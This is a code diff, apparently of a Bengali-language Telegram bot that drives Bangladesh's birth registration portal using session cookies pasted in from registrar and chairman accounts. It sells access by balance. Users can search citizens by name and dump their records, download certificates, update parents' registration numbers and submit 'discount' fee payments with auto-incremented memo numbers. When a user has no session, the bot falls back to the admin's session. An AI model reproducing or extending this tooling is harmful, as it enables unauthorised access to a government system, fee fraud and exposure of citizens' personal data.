-    get_session(m.chat.id)["temp_data"]["ubrn"]["m"] = "" if m.text == '0' else m.text.strip()
-    bot.register_next_step_handler(bot.send_message(m.chat.id, "৪. ফোন নম্বর:"), ubrn_ph_step)
-
-def ubrn_ph_step(m):
-    if is_cancel(m): return
-    chat_id, u_sess = m.chat.id, get_session(m.chat.id)
-    phone = "+88" + m.text.strip() if m.text.strip().startswith('01') else m.text.strip()
-    u_sess["temp_data"]["ubrn"]["ph"] = phone
-    d = u_sess["temp_data"]["ubrn"]
-    res = call_api(chat_id, f"https://bdris.gov.bd/admin/br/parents-ubrn-update/send-otp?personBrn={d['p']}&fatherBrn={d['f']}&motherBrn={d['m']}&phone={quote(phone)}&email=", method="POST")
-    if res and res.status_code == 200: 
-        bot.register_next_step_handler(bot.send_message(chat_id, "✅ OTP দিন:"), ubrn_final)
-    else: 
-        bot.send_message(chat_id, "❌ OTP পাঠাতে ব্যর্থ।")
-
-def ubrn_final(m):
-    if is_cancel(m): return
-    chat_id, u_sess = m.chat.id, get_session(m.chat.id)
-    d = u_sess["temp_data"]["ubrn"]
-    p = {'_csrf': u_sess["csrf"], 'personBrn': d['p'], 'fatherBrn': d['f'], 'motherBrn': d['m'], 'phone': d['ph'], 'email': '', 'otp': m.text.strip()}
-    res = call_api(chat_id, "https://bdris.gov.bd/admin/br/parents-ubrn-update", method="POST", data=p)
-    bot.send_message(chat_id, "✅ আপডেট সফল!" if res and res.status_code == 200 else "❌ ব্যর্থ!")
-
-# ==========================================
-# ৯. সার্চ ও পিডিএফ প্রিন্ট (JSON + UBRN)
-# ==========================================
-def process_search_by_name(m):
-    if is_cancel(m): return
-    payload = f"personNameBn={quote(m.text.strip())}&personNameEn=&nameLang=BENGALI"
-    navigate_to(m.chat.id, "https://bdris.gov.bd/admin/br/advanced-search-by-name")
-    res = call_api(m.chat.id, "https://bdris.gov.bd/api/br/advanced-search-by-name", method="POST", data=payload)
-    if res: 
-        try:
-            bot.send_message(m.chat.id, f"📊 **Search Result:**\n```json\n{json.dumps(res.json(), indent=2, ensure_ascii=False)}\n```", parse_mode='Markdown')
-        except Exception as e:
-            logging.error(f"Search Result Format Error: {e}")
-
-def process_search_by_ubrn(m):
-    if is_cancel(m): return
-    ubrn = m.text.strip()
-    res = call_api(m.chat.id, f"https://bdris.gov.bd/api/br/info/ubrn/{ubrn}")
-    if res and res.status_code == 200:
-        try:
-            bot.send_message(m.chat.id, f"📊 **UBRN Result:**\n```json\n{json.dumps(res.json(), indent=2, ensure_ascii=False)}\n```", parse_mode='Markdown')
-        except Exception as e:
-            logging.error(f"UBRN JSON Error: {e}")
-    else: 
-        bot.send_message(m.chat.id, "❌ তথ্য পাওয়া যায়নি।")
-
-def download_server_by_ubrn(m):
-    if is_cancel(m): return
-    chat_id, ubrn = m.chat.id, m.text.strip()
-    res = call_api(chat_id, f"https://bdris.gov.bd/api/br/info/ubrn/{ubrn}")
-    if res and res.status_code == 200:
-        enc_id = res.json().get('encryptedId')
-        if enc_id: download_server_pdf(chat_id, enc_id, f"PDF_{ubrn}")
-        else: bot.send_message(chat_id, "❌ Encrypted ID পাওয়া যায়নি।")
-    else: bot.send_message(chat_id, "❌ UBRN পাওয়া যায়নি।")
-
-def download_server_pdf(chat_id, enc_id, filename):
-    sess, _ = get_active_session(get_session(chat_id))
+def admin_add_balance_step(m, target_id, admin_msg_id):
+    if is_cancel(m):
+        return
     try:
-        sess.get(f"https://bdris.gov.bd/admin/new-certificate/check?data={enc_id}", timeout=60)
-        res = sess.get(f"https://bdris.gov.bd/admin/new-certificate/print?data={enc_id}", timeout=180)
+        amount = int(m.text.strip())
+        if amount <= 0:
+            raise ValueError
+        update_balance(target_id, amount)
+        safe_send(m.chat.id, f"✅ User {target_id} এর অ্যাকাউন্টে {amount}৳ যোগ হয়েছে।")
+        safe_send(
+            target_id,
+            f"🎉 *রিচার্জ সফল!*\nযোগ হয়েছে: {amount}৳\nব্যালেন্স: {get_balance(target_id)}৳",
+            parse_mode="Markdown"
+        )
+        safe_delete(m.chat.id, admin_msg_id)
+    except Exception:
+        safe_send(m.chat.id, "❌ ভুল ইনপুট। শুধু পজিটিভ সংখ্যা দিন।")
+
+# ==========================================
+# ৭. সার্ভার পিডিএফ ও ডাউনলোড
+# ==========================================
+def download_server_by_ubrn(m):
+    if is_cancel(m):
+        return
+    uid, cid = m.from_user.id, m.chat.id
+    ubrn = m.text.strip() if m.text else ""
+    if not (ubrn.isdigit() and len(ubrn) == 17):
+        msg = safe_send(cid, "❌ সঠিক ১৭ ডিজিট UBRN দিন:")
+        if msg:
+            bot.register_next_step_handler(msg, download_server_by_ubrn)
+        return
+
+    u_sess = get_session(uid)
+    working_uid = uid if u_sess["is_alive"] else ADMIN_ID
+    if working_uid == ADMIN_ID and not get_session(ADMIN_ID)["is_alive"]:
+        return safe_send(cid, "❌ সিস্টেম অফলাইন। অ্যাডমিন সেশন নেই।")
+
+    cost = get_service_cost(uid, "server_pdf_login" if working_uid == uid else "server_pdf_no_login")
+    if get_balance(uid) < cost:
+        return safe_send(cid, f"❌ পর্যাপ্ত ব্যালেন্স ({cost}৳) নেই।")
+
+    task_id = f"dl_{uid}_{ubrn}"
+    with download_lock:
+        if task_id in active_downloads:
+            return safe_send(cid, "⚠️ অলরেডি প্রসেসিং হচ্ছে...")
+        active_downloads.add(task_id)
+
+    update_balance(uid, -cost)
+    wait = safe_send(cid, f"⏳ সার্ভারে খোঁজা হচ্ছে... (চার্জ: {cost}৳)")
+
+    def run():
+        try:
+            work_sess = get_session(working_uid)["req_session"]
+            res = work_sess.get(
+                f"https://bdris.gov.bd/api/br/info/ubrn/{ubrn}",
+                timeout=30
+            )
+            if wait:
+                safe_delete(cid, wait.message_id)
+
+            if res.status_code == 200 and 'encryptedId' in res.json():
+                download_server_pdf(cid, uid, working_uid, res.json()['encryptedId'], f"PDF_{ubrn}", cost)
+            else:
+                update_balance(uid, cost)
+                safe_send(cid, "❌ তথ্য পাওয়া যায়নি। ব্যালেন্স রিফান্ড করা হয়েছে।")
+        except Exception as e:
+            logging.error(f"UBRN download error: {e}")
+            update_balance(uid, cost)
+            safe_send(cid, "❌ সার্ভার এরর। রিফান্ড করা হয়েছে।")
+        finally:
+            with download_lock:
+                active_downloads.discard(task_id)
+
+    Thread(target=run, daemon=True).start()
+
+def download_server_pdf(chat_id, user_id, session_uid, enc_id, filename, cost):
+    u = get_session(session_uid)
+    sess = u["ch_session"] if u["mode"] == "CHAIRMAN" else u["req_session"]
+    try:
+        safe_send(chat_id, "📥 পিডিএফ জেনারেট হচ্ছে...")
+        sess.get(f"https://bdris.gov.bd/admin/new-certificate/check?data={enc_id}", timeout=30)
+        res = sess.get(f"https://bdris.gov.bd/admin/new-certificate/print?data={enc_id}", timeout=60)
         if 'application/pdf' in res.headers.get('Content-Type', ''):
             bot.send_document(chat_id, io.BytesIO(res.content), visible_file_name=f"{filename}.pdf")
-        else: bot.send_message(chat_id, "⚠️ পিডিএফ পাওয়া যায়নি।")
+            safe_send(chat_id, f"✅ ডাউনলোড সফল! বর্তমান ব্যালেন্স: {get_balance(user_id)}৳")
+        else:
+            update_balance(user_id, cost)
+            safe_send(chat_id, "❌ পিডিএফ পাওয়া যায়নি। রিফান্ড করা হয়েছে।")
     except Exception as e:
-        logging.error(f"❌ PDF Download Error for {chat_id}: {e}")
-        bot.send_message(chat_id, "❌ ডাউনলোড প্রক্রিয়ায় সমস্যা হয়েছে।")
+        logging.error(f"PDF download error: {e}")
+        update_balance(user_id, cost)
+        safe_send(chat_id, "❌ প্রসেসিং এরর। রিফান্ড করা হয়েছে।")
 
 # ==========================================
-# ১০. অ্যাডমিন কন্ট্রোল ও কলব্যাক হ্যান্ডলার
+# ৮. অ্যাপ্লিকেশন লিস্ট UI (FIX: ফাংশন ছিল না)
 # ==========================================
-def admin_edit_field(m, target_cid, field):
-    if is_cancel(m): return
-    t_sess = get_session(target_cid)
-    val = m.text.strip()
-    try:
-        if field == "SEC":
-            s, t = extract_sid_tsid(val)
-            if s: t_sess["req_session"].cookies.set("SESSION", s, domain='bdris.gov.bd'); t_sess["req_session"].cookies.set("TS0108b707", t, domain='bdris.gov.bd')
-        elif field == "CH":
-            s, t = extract_sid_tsid(val)
-            if s: t_sess["ch_session"].cookies.set("SESSION", s, domain='bdris.gov.bd'); t_sess["ch_session"].cookies.set("TS0108b707", t, domain='bdris.gov.bd')
-        elif field == "OTP": t_sess["ch_otp"] = val
-        save_session_to_db(target_cid, t_sess)
-        bot.send_message(m.chat.id, f"✅ User {target_cid} এর {field} আপডেট হয়েছে!")
-    except Exception as e: 
-        logging.error(f"❌ Admin Edit Error: {e}")
-        bot.send_message(m.chat.id, "❌ আপডেট ব্যর্থ।")
+CATEGORY_URLS = {
+    'apps': "https://bdris.gov.bd/admin/birth-registration/list",
+    'corr': "https://bdris.gov.bd/admin/birth-registration/correction-list",
+    'repr': "https://bdris.gov.bd/admin/birth-registration/reprint-list",
+}
+CATEGORY_LABELS = {
+    'apps': "📋 Applications",
+    'corr': "📝 Correction",
+    'repr': "🔄 Reprint",
+}
 
+def handle_category_init(m, cat):
+    """যেকোনো ক্যাটাগরির লিস্ট শুরু করে।"""
+    uid, cid = m.from_user.id, m.chat.id
+    u = get_session(uid)
+    with session_lock:
+        u["app_start"] = 0
+    fetch_list_ui(cid, uid, cat)
+
+def fetch_list_ui(chat_id, user_id, cat, edit_msg_id=None):
+    """সার্ভার থেকে লিস্ট এনে ইনলাইন কিবোর্ড সহ দেখায়।"""
+    u = get_session(user_id)
+    if not u["is_alive"]:
+        return safe_send(chat_id, "❌ আগে লগইন করুন।")
+
+    url = CATEGORY_URLS.get(cat)
+    if not url:
+        return safe_send(chat_id, "❌ অজানা ক্যাটাগরি।")
+
+    wait = None
+    if not edit_msg_id:
+        wait = safe_send(chat_id, "⏳ লোড হচ্ছে...")
+
+    def run():
+        try:
+            params = {
+                "start": u["app_start"],
+                "length": u["app_length"],
+                "draw": 1
+            }
+            res = u["req_session"].get(
+                url,
+                params=params,
+                headers={"User-Agent": u["ua"], "X-Requested-With": "XMLHttpRequest"},
+                timeout=30
+            )
+            if wait:
+                safe_delete(chat_id, wait.message_id)
+
+            if res.status_code != 200:
+                return safe_send(chat_id, "❌ সার্ভার রেসপন্স করেনি।")
+
+            try:
+                data = res.json()
+            except Exception:
+                return safe_send(chat_id, "❌ ডেটা পার্স করা যায়নি।")
+
+            records = data.get("data", [])
+            total = data.get("recordsTotal", 0)
+
+            if not records:
+                return safe_send(chat_id, "📭 কোনো রেকর্ড পাওয়া যায়নি।")
+
+            text_lines = [f"*{CATEGORY_LABELS.get(cat, cat)}* — মোট: {total}\n"]
+            markup = telebot.types.InlineKeyboardMarkup()
+
+            for i, rec in enumerate(records):
+                name = rec.get("name") or rec.get("applicantName") or "N/A"
+                ubrn = rec.get("ubrn") or rec.get("registrationNo") or "N/A"
+                enc_id = rec.get("encryptedId") or ""
+
+                short_id = f"{i}"
+                with session_lock:
+                    u["id_cache"][short_id] = enc_id
+
+                text_lines.append(f"{u['app_start'] + i + 1}. {name} | {ubrn}")
+
+                row_btns = []
+                if enc_id:
+                    row_btns.append(
+                        telebot.types.InlineKeyboardButton(
+                            f"💳 Pay #{u['app_start'] + i + 1}",
+                            callback_data=f"pay:{short_id}"
+                        )
+                    )
+                if row_btns:
+                    markup.row(*row_btns)
+
+            # Pagination
+            nav_row = []
+            if u["app_start"] > 0:
+                nav_row.append(telebot.types.InlineKeyboardButton("⬅️ Prev", callback_data=f"prev:{cat}"))
+            if u["app_start"] + u["app_length"] < total:
+                nav_row.append(telebot.types.InlineKeyboardButton("Next ➡️", callback_data=f"next:{cat}"))
+            if nav_row:
+                markup.row(*nav_row)
+
+            # Page size selector
+            markup.row(
+                telebot.types.InlineKeyboardButton("5/page", callback_data=f"setlength:{cat}:5"),
+                telebot.types.InlineKeyboardButton("10/page", callback_data=f"setlength:{cat}:10"),
+                telebot.types.InlineKeyboardButton("20/page", callback_data=f"setlength:{cat}:20"),
+            )
+
+            full_text = "\n".join(text_lines)
+            if edit_msg_id:
+                safe_edit(chat_id, edit_msg_id, full_text, reply_markup=markup, parse_mode="Markdown")
+            else:
+                safe_send(chat_id, full_text, reply_markup=markup, parse_mode="Markdown")
+
+        except Exception as e:
+            logging.error(f"fetch_list_ui error: {e}")
+            if wait:
+                safe_delete(chat_id, wait.message_id)
+            safe_send(chat_id, "❌ লিস্ট লোড করতে সমস্যা হয়েছে।")
+
+    Thread(target=run, daemon=True).start()
+
+# ==========================================
+# ৮.১ অ্যাডমিন — ইউজার ম্যানেজমেন্ট (FIX: callback ছিল না)
+# ==========================================
+def send_user_detail_panel(chat_id, target_id):
+    record = access_collection.find_one({"chat_id": target_id})
+    if not record:
+        return safe_send(chat_id, "❌ ইউজার খুঁজে পাওয়া যায়নি।")
+
+    name = record.get("name", "N/A")
+    balance = record.get("balance", 0)
+    status = record.get("status", "N/A")
+    perms = record.get("permissions", {})
+
+    text = (
+        f"👤 *ইউজার ডিটেইল*\n"
+        f"নাম: {name}\n"
+        f"ID: `{target_id}`\n"
+        f"ব্যালেন্স: {balance}৳\n"
+        f"স্ট্যাটাস: {status}\n"
+        f"পারমিশন: {', '.join(k for k, v in perms.items() if v)}"
+    )
+    markup = telebot.types.InlineKeyboardMarkup()
+    toggle_status = "block" if status == "allowed" else "unblock"
+    toggle_label = "🚫 Block" if status == "allowed" else "✅ Unblock"
+    markup.row(
+        telebot.types.InlineKeyboardButton(toggle_label, callback_data=f"usrtoggle:{target_id}:{toggle_status}"),
+        telebot.types.InlineKeyboardButton("➕ Add Balance", callback_data=f"addbal:{target_id}")
+    )
+    safe_send(chat_id, text, reply_markup=markup, parse_mode="Markdown")
+
+# ==========================================
+# ৯. কলব্যাক হ্যান্ডলার
+# ==========================================
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
-    chat_id = call.message.chat.id
-    
-    # ইনলাইন বাটনে রেট লিমিট চেক
-    if is_rate_limited(chat_id):
-        return bot.answer_callback_query(call.id, "⚠️ একটু ধীরে ক্লিক করুন!", show_alert=True)
+    uid, cid = call.from_user.id, call.message.chat.id
+    u = get_session(uid)
+    parts = call.data.split(':')
+    action = parts[0]
 
-    if not check_user_access(chat_id, call.from_user.first_name): return
-    
-    u_sess, perms = get_session(chat_id), get_user_permissions(chat_id)
-    parts = call.data.split('_')
-    action, sid = parts[0], parts[1] if len(parts) > 1 else ""
-    enc_id = u_sess["id_cache"].get(sid)
+    if is_rate_limited(uid):
+        bot.answer_callback_query(call.id, "⚠️ বেশি দ্রুত ক্লিক করছেন। একটু অপেক্ষা করুন।")
+        return
 
-    # --- Pagination ---
-    if action in ["next", "prev"]:
-        u_sess["app_start"] = max(0, u_sess["app_start"] + (u_sess["app_length"] if action == "next" else -u_sess["app_length"]))
-        fetch_list_ui(call.message, sid, False)
+    # ---- Admin: Approve recharge ----
+    if action == "apprvbal" and uid == ADMIN_ID:
+        target = int(parts[1])
+        msg = safe_send(cid, f"ইউজার `{target}` এর জন্য অ্যামাউন্ট দিন:", parse_mode="Markdown")
+        if msg:
+            bot.register_next_step_handler(
+                msg, lambda m: admin_add_balance_step(m, target, call.message.message_id)
+            )
+        bot.answer_callback_query(call.id)
 
-    # --- Admin Controls (ON/OFF Logic) ---
-    elif action in ["admuser", "tgl", "edsec", "edch", "edotp", "block", "unblock"] and call.from_user.id == ADMIN_ID:
-        target = int(sid)
-        if action == "admuser":
-            p = (access_collection.find_one({"chat_id": target}) or {}).get("permissions", DEFAULT_PERMS)
-            msg = f"👤 **User:** `{target}`\nCH OTP: `{get_session(target).get('ch_otp', 'N/A')}`\n\nপারমিশন কন্ট্রোল করুন:"
-            markup = telebot.types.InlineKeyboardMarkup()
-            markup.row(telebot.types.InlineKeyboardButton("✏️ SEC", callback_data=f"edsec_{target}"), telebot.types.InlineKeyboardButton("✏️ CH", callback_data=f"edch_{target}"), telebot.types.InlineKeyboardButton("✏️ OTP", callback_data=f"edotp_{target}"))
-            
-            # এখানে বাটনগুলো অন/অফ আকারে দেখাবে
-            cmd_labels = [("apps", "Apps"), ("corr", "Corr"), ("repr", "Repr"), ("search", "Search"), ("ubrn_update", "UBRN Update"), ("server_pdf", "Srv PDF"), ("print", "Inline Print")]
-            for k, n in cmd_labels:
-                st = p.get(k, True)
-                markup.row(telebot.types.InlineKeyboardButton(f"{'❌ Disable' if st else '✅ Enable'} {n}", callback_data=f"tgl_{target}_{k}_{'off' if st else 'on'}"))
-            bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')
-        
-        elif action == "tgl":
-            access_collection.update_one({"chat_id": int(parts[1])}, {"$set": {f"permissions.{parts[2]}": parts[3] == "on"}})
-            call.data = f"admuser_{parts[1]}"; callback_handler(call)
-        
-        elif action == "edsec": bot.register_next_step_handler(bot.send_message(chat_id, f"User {target} এর নতুন SEC সেশন দিন:"), admin_edit_field, target, "SEC")
-        elif action == "edch": bot.register_next_step_handler(bot.send_message(chat_id, f"User {target} এর নতুন CH সেশন দিন:"), admin_edit_field, target, "CH")
-        elif action == "edotp": bot.register_next_step_handler(bot.send_message(chat_id, f"User {target} এর নতুন OTP দিন:"), admin_edit_field, target, "OTP")
-        elif action == "block": access_collection.update_one({"chat_id": int(sid)}, {"$set": {"status": "blocked"}})
-        elif action == "unblock": access_collection.update_one({"chat_id": int(sid)}, {"$set": {"status": "allowed"}})
+    # ---- Admin: Reject recharge ----
+    elif action == "rejbal" and uid == ADMIN_ID:
+        target = int(parts[1])
+        safe_send(target, "❌ আপনার রিচার্জ রিকোয়েস্ট অ্যাডমিন বাতিল করেছেন।")
+        safe_delete(cid, call.message.message_id)
+        bot.answer_callback_query(call.id, "বাতিল করা হয়েছে।")
 
-    # --- Core Actions ---
-    elif action == "print" and enc_id:
-        if perms.get("print") or chat_id == ADMIN_ID:
-            bot.answer_callback_query(call.id, "⏳ ডাউনলোড শুরু...")
-            download_server_pdf(chat_id, enc_id, f"Cert_{sid}")
-        else: bot.answer_callback_query(call.id, "🚫 অনুমতি নেই!", show_alert=True)
+    # ---- Admin: Add balance directly ----
+    elif action == "addbal" and uid == ADMIN_ID:
+        target = int(parts[1])
+        msg = safe_send(cid, f"ইউজার `{target}` এর জন্য অ্যামাউন্ট দিন:", parse_mode="Markdown")
+        if msg:
+            bot.register_next_step_handler(
+                msg, lambda m: admin_add_balance_step(m, target, call.message.message_id)
+            )
+        bot.answer_callback_query(call.id)
 
-    elif action == "pay" and enc_id:
-        payload = {'data': enc_id, 'paymentType': 'PAYMENT_BY_DISCOUNT', 'discountAmount': '50', 'discountSharokNo': str(u_sess["sharok_no"]), 'discountSharokDate': datetime.now().strftime("%d/%m/%Y"), '_csrf': u_sess["csrf"]}
-        res = call_api(chat_id, "https://bdris.gov.bd/api/payment/receive", method="POST", data=payload)
-        if res and res.status_code == 200:
-            u_sess["sharok_no"] += 1
-            bot.answer_callback_query(call.id, "✅ পেমেন্ট সফল!")
-        else: bot.answer_callback_query(call.id, "❌ পেমেন্ট ব্যর্থ!")
+    # ---- Admin: Block/Unblock user ----
+    elif action == "usrtoggle" and uid == ADMIN_ID:
+        target = int(parts[1])
+        new_status = "allowed" if parts[2] == "unblock" else "blocked"
+        access_collection.update_one({"chat_id": target}, {"$set": {"status": new_status}})
+        bot.answer_callback_query(call.id, f"স্ট্যাটাস '{new_status}' করা হয়েছে।")
+        safe_delete(cid, call.message.message_id)
+        send_user_detail_panel(cid, target)
 
-    elif action == "recv" and enc_id:
-        res = call_api(chat_id, "https://bdris.gov.bd/api/application/receive", method="POST", data={'data': enc_id, '_csrf': u_sess["csrf"]})
-        if res and res.status_code == 200: bot.answer_callback_query(call.id, "✅ রিসিভ সফল!", show_alert=True)
-        else: bot.answer_callback_query(call.id, "❌ রিসিভ ব্যর্থ!", show_alert=True)
+    # ---- Admin: User detail panel ----
+    elif action == "admuser" and uid == ADMIN_ID:
+        target = int(parts[1])
+        bot.answer_callback_query(call.id)
+        send_user_detail_panel(cid, target)
 
-    elif action in ["reg", "coreg"] and u_sess["mode"] == "CHAIRMAN" and enc_id:
-        bot.answer_callback_query(call.id, "⏳ রেজিস্ট্রেশন হচ্ছে...")
-        path = "correction-application" if action == "coreg" else "application"
+    # ---- Page size ----
+    elif action == "setlength":
+        with session_lock:
+            u["app_length"] = int(parts[2])
+            u["app_start"] = 0
+        save_session_to_db(uid, u)
+        bot.answer_callback_query(call.id, f"প্রতি পেজে {parts[2]}টি সেট হয়েছে।")
+        fetch_list_ui(cid, uid, parts[1], call.message.message_id)
+
+    # ---- Pagination ----
+    elif action in ["next", "prev"]:
+        with session_lock:
+            if action == "next":
+                u["app_start"] += u["app_length"]
+            else:
+                u["app_start"] = max(0, u["app_start"] - u["app_length"])
+        fetch_list_ui(cid, uid, parts[1], call.message.message_id)
+        bot.answer_callback_query(call.id)
+
+    # ---- Pay ----
+    elif action == "pay":
+        short_id = parts[1]
+        enc_id = u["id_cache"].get(short_id)
+        if not enc_id:
+            return bot.answer_callback_query(call.id, "❌ ক্যাশ এক্সপায়ার হয়েছে!", show_alert=True)
+
+        cost = get_service_cost(uid, "pay")
+        if get_balance(uid) < cost:
+            return bot.answer_callback_query(call.id, f"❌ ব্যালেন্স নেই ({cost}৳)।", show_alert=True)
+
+        update_balance(uid, -cost)
+        data = {
+            'data': enc_id,
+            'paymentType': 'PAYMENT_BY_DISCOUNT',
+            'discountAmount': '50',
+            'discountSharokNo': str(u["sharok_no"]),
+            'discountSharokDate': datetime.now().strftime("%d/%m/%Y"),
+            '_csrf': u["csrf"]
+        }
         try:
-            html = get_active_session(u_sess)[0].get(f"https://bdris.gov.bd/admin/br/{path}/register?data={enc_id}").text
-            v = re.search(r'<option\s+value="(\d{17})"[^>]*>([^<]+)</option>', html)
-            if v:
-                p = {"birthPlaceAndDobVerifierName": v.group(2).strip(), "birthPlaceAndDobVerifierBrn": v.group(1), "birthPlaceAndDobVerificationDate": datetime.now().strftime("%d/%m/%Y"), "otp": u_sess["ch_otp"], "data": enc_id}
-                res = call_api(chat_id, f"https://bdris.gov.bd/api/br/{path}/register", method="POST", data=p)
-                if res and res.status_code == 200: bot.send_message(chat_id, "✅ রেজিস্ট্রেশন সফল!")
-                else: bot.send_message(chat_id, "❌ রেজিস্ট্রেশন ব্যর্থ।")
-            else: bot.send_message(chat_id, "❌ ভেরিফায়ার পাওয়া যায়নি।")
+            res = u["req_session"].post(
+                "https://bdris.gov.bd/api/payment/receive",
+                data=data,
+                timeout=30
+            )
+            if res.status_code == 200:
+                with session_lock:
+                    u["sharok_no"] += 1
+                save_session_to_db(uid, u)
+                bot.answer_callback_query(call.id, "✅ পেমেন্ট সফল!")
+                safe_send(cid, f"✅ পেমেন্ট সফল হয়েছে। চার্জ: {cost}৳।")
+            else:
+                update_balance(uid, cost)
+                bot.answer_callback_query(call.id, "❌ সার্ভার রিজেক্ট করেছে। রিফান্ড করা হয়েছে।", show_alert=True)
         except Exception as e:
-            logging.error(f"❌ Registration Request Error: {e}")
-            bot.send_message(chat_id, "❌ প্রক্রিয়ায় ক্র্যাশ হয়েছে।")
+            logging.error(f"Payment error: {e}")
+            update_balance(uid, cost)
+            bot.answer_callback_query(call.id, "❌ নেটওয়ার্ক এরর। রিফান্ড করা হয়েছে।", show_alert=True)
+
+    else:
+        bot.answer_callback_query(call.id)
 
 # ==========================================
-# ১১. মেইন রাউটার (All Buttons Guarded)
+# ১০. /start হ্যান্ডলার (FIX: ছিল না)
+# ==========================================
+@bot.message_handler(commands=['start'])
+def start_handler(m):
+    uid, cid = m.from_user.id, m.chat.id
+    if not check_user_access(uid, m.from_user.first_name):
+        return safe_send(cid, "🚫 অ্যাক্সেস ব্লক করা হয়েছে।")
+    safe_send(
+        cid,
+        "🚀 *বিডিআরআইএস মাস্টার বট*\nস্বাগতম! মেনু থেকে অপশন বেছে নিন।",
+        reply_markup=generate_main_menu(cid, uid),
+        parse_mode="Markdown"
+    )
+
+# ==========================================
+# ১১. মেইন রাউটার
 # ==========================================
 @bot.message_handler(func=lambda m: True)
 def router(m):
-    cid, t = m.chat.id, m.text
-    
-    # টেক্সট কমান্ডে রেট লিমিট চেক
-    if is_rate_limited(cid): return
-    
-    if not check_user_access(cid, m.from_user.first_name): return
-    u_sess, perms = get_session(cid), get_user_permissions(cid)
+    cid, uid = m.chat.id, m.from_user.id
+    t = m.text or ""
 
-    if "/start" in t or "Back to Menu" in t: bot.send_message(cid, "🚀 BDRIS Master Bot Active!", reply_markup=generate_main_menu(cid))
-    
-    # User Login বাটন সবসময় এভেইলেবল
-    elif t == "🔑 User Login":
-        msg = bot.send_message(cid, "✅ নিবন্ধকের সেশন দিন (SESSION ও TS):")
-        bot.register_next_step_handler(msg, role_step_1)
-        
-    elif t == "🔑 Admin Login" and cid == ADMIN_ID:
-        msg = bot.send_message(cid, "🔑 এডমিন সেশন দিন:")
-        bot.register_next_step_handler(msg, lambda m: admin_login_logic(m))
+    if is_rate_limited(uid):
+        return safe_send(cid, "⚠️ একটু ধীরে। কিছুক্ষণ পরে আবার চেষ্টা করুন।")
+    if not check_user_access(uid, m.from_user.first_name):
+        return safe_send(cid, "🚫 অ্যাক্সেস ব্লক।")
 
-    elif t == "👤 নিবন্ধক সেকশন":
-        u_sess["mode"] = "CHAIRMAN"; save_session_to_db(cid, u_sess)
-        bot.send_message(cid, "✅ নিবন্ধক সেকশন (Registration Mode) চালু।", reply_markup=generate_main_menu(cid))
+    u_sess = get_session(uid)
+    with session_lock:
+        u_sess["last_action_time"] = time.time()
+    perms = get_user_permissions(uid)
 
-    elif t == "🧑‍💼 অদোরাইজড সেকশন":
-        u_sess["mode"] = "SECRETARY"; save_session_to_db(cid, u_sess)
-        bot.send_message(cid, "✅ অদোরাইজড সেকশন (Payment Mode) চালু।", reply_markup=generate_main_menu(cid))
+    # ---- Admin-only commands ----
+    if uid == ADMIN_ID:
+        if t == "🔑 Admin Login":
+            msg = safe_send(cid, "এডমিন কুকি দিন (SESSION= ও TS...=):")
+            if msg:
+                bot.register_next_step_handler(msg, admin_login_logic)
+            return
+        elif t == "🛠️ Check Cookies":
+            cookies = u_sess['req_session'].cookies.get_dict()
+            return safe_send(
+                cid,
+                f"SEC: `{cookies}`\nOTP: `{u_sess['ch_otp']}`",
+                parse_mode="Markdown"
+            )
+        elif t == "👥 Manage Users":
+            users = list(access_collection.find({}))
+            if not users:
+                return safe_send(cid, "কোনো ইউজার নেই।")
+            markup = telebot.types.InlineKeyboardMarkup()
+            for user in users:
+                label = f"{user.get('name', 'N/A')} | {user.get('balance', 0)}৳ | {user.get('status', 'N/A')}"
+                markup.row(
+                    telebot.types.InlineKeyboardButton(
+                        label[:60],
+                        callback_data=f"admuser:{user.get('chat_id')}"
+                    )
+                )
+            return safe_send(cid, "👥 *ইউজার প্যানেল:*", reply_markup=markup, parse_mode="Markdown")
 
-    # --- কমান্ড পারমিশন গার্ড ---
-    elif t == "📋 Applications" and (perms.get("apps") or cid == ADMIN_ID): handle_category_init(m, 'apps')
-    elif t == "📝 Correction" and (perms.get("corr") or cid == ADMIN_ID): handle_category_init(m, 'corr')
-    elif t == "🔄 Reprint" and (perms.get("repr") or cid == ADMIN_ID): handle_category_init(m, 'repr')
+    # ---- User Login ----
+    if t == "🔑 User Login":
+        msg = safe_send(cid, "নিবন্ধক সেশন দিন (SESSION= ও TS...=):")
+        if msg:
+            bot.register_next_step_handler(msg, role_step_1)
 
-    elif t == "🌐 Search By Name" and (perms.get("search") or cid == ADMIN_ID):
-        msg = bot.send_message(cid, "🔍 নাম দিন (Bangla):")
-        bot.register_next_step_handler(msg, lambda x: process_search_by_name(x))
-        
-    elif t == "🔢 Search By UBRN" and (perms.get("search") or cid == ADMIN_ID):
-        msg = bot.send_message(cid, "🔢 UBRN দিন:")
-        bot.register_next_step_handler(msg, lambda x: process_search_by_ubrn(x))
-    
-    elif t == "👨‍👩‍👦 পিতা-মাতার UBRN হালনাগাদ" and (perms.get("ubrn_update") or cid == ADMIN_ID): start_ubrn_flow(m)
-    
-    elif t == "🖨️ Server PDF Print" and (perms.get("server_pdf") or cid == ADMIN_ID):
-        msg = bot.send_message(cid, "🖨️ ১৭ ডিজিট UBRN:")
-        bot.register_next_step_handler(msg, lambda x: download_server_by_ubrn(x))
+    # ---- Server PDF ----
+    elif t == "🖨️ Server PDF Print":
+        if not (perms.get("server_pdf") or uid == ADMIN_ID):
+            return safe_send(cid, "🚫 এই ফিচারে আপনার অ্যাক্সেস নেই।")
+        msg = safe_send(cid, "১৭ ডিজিট UBRN দিন:")
+        if msg:
+            bot.register_next_step_handler(msg, download_server_by_ubrn)
 
-    elif t == "🛠️ Check Cookies" and cid == ADMIN_ID:
-        c1 = u_sess["req_session"].cookies.get_dict()
-        c2 = u_sess["ch_session"].cookies.get_dict()
-        bot.send_message(cid, f"**SEC:** `{c1}`\n**CH:** `{c2}`\n**OTP:** `{u_sess['ch_otp']}`", parse_mode="Markdown")
+    # ---- Profile & Recharge ----
+    elif t == "💰 My Profile & Recharge":
+        bal = get_balance(uid)
+        safe_send(cid, f"💰 *আপনার প্রোফাইল*\nID: `{uid}`\nব্যালেন্স: {bal}৳\n\nরিচার্জ করতে TrxID দিন:", parse_mode="Markdown")
+        msg = safe_send(cid, "TrxID ইনপুট করুন:")
+        if msg:
+            bot.register_next_step_handler(msg, process_recharge)
 
-    elif t == "👥 Manage Users" and cid == ADMIN_ID:
-        users = list(access_collection.find({}))
-        markup = telebot.types.InlineKeyboardMarkup()
-        for u in users: markup.row(telebot.types.InlineKeyboardButton(f"{u.get('name')} ({u.get('chat_id')})", callback_data=f"admuser_{u.get('chat_id')}"))
